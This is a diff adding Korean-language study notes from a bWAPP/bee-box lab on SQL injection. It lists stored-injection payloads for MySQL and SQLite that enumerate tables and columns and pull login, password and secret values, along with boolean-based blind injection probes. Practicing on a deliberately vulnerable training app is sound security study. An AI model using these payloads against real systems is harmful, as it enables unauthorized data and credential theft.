@@ -1,0 +1,78 @@
+mysql -u root -p  << mysql 들어가는 코드
+
+
+DATABASE -> TABLE -> COLUMN -> 데이터 값
+요 순서대로 볼거다.
+
+
+vi sqli_7.php  << bee box 에서
+
+
+use information_schema; << mysql 에서 입력 하면 들어가진다.
+desc tables; << table 안에 모든것을 볼수잇다.
+
+$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
+
+test', (select database())) #
+
+test',(select table_name from information_schema.tables limit 0,1)) #
+test',(select table_name from information_schema.tables limit 3,1)) #
+test',(select table_name from information_schema.tables limit 11,1)) #
+
+test',(select column_name from information_schema.columns where table_name="heroes"limit 0,1))#
+test',(select column_name from information_schema.columns where table_name="heroes"limit 1,1))#
+test',(select column_name from information_schema.columns where table_name="heroes"limit 2,1))#
+test',(select column_name from information_schema.columns where table_name="heroes"limit 3,1))#
+
+test',(select concat(login, password, secret) from heroes limit 0,1))#
+
+
+
+SQL Injection - Stored (SQLite) < - ( 언제 넘어간다고 말햇지..ㅋㅋㅋㅋ )
+
+$sql = "INSERT INTO blog (id, date, entry, owner) VALUES (" . ++$id . ",'" . date('Y-m-d', time()) . "','" . $entry . "','" . $owner . "');";
+
+', (select sqlite_version())) -- <<
+
+',(select tbl_name from sqlite_master limit 0,1 )) --
+',(select tbl_name from sqlite_master limit 1,1 )) --
+',(select tbl_name from sqlite_master limit 2,1 )) --
+',(select tbl_name from sqlite_master limit 3,1 )) --
+
+',(select sql from sqlite_master where tbl_name="users")) --
+
+',(select login from users limit 0,1)) --
+',(select password from users limit 0,1)) --
+',(select secret from users limit 0,1)) --
+
+',(select login from users limit 1,1)) --
+',(select password from users limit 1,1)) --
+',(select secret from users limit 1,1)) --
+
+
+SQL Injection - Blind - Boolean-Based
+시간이 제일 오래 걸리는 Injection
+
+The movie does not exist in our database!  < 자기가 인증하는 database 는 출력  (참)
+
+
+Incorrect syntax detected! < 작은 따옴표 넣엇을때 나오는 표시  (거짓)
+
+$sql = "SELECT * FROM movies WHERE title = 'or 1=1 and length(database())=1 #'";
+The movie does not exist in our database!
+$sql = "SELECT * FROM movies WHERE title = 'or 1=1 and length(database())=5 #'";
+The movie exists in our database!
+
+$sql = "SELECT * FROM movies WHERE title = 'or 1=1 and substring(database(),1,1)='b' #'";
+The movie exists in our database!
+
+[참고] 실습 함수
+
+- length()                지정한 문자열의 길이를 반환
+- length(database())=5
+
+- substring()             지정한 문자열의 내용을 반환
+- substring(database(),1,1)='b'
+
+ex ) 'or 1=1 and length(database())=1 #
+     'or 1=1 and substring(database(),1,1)='b'#
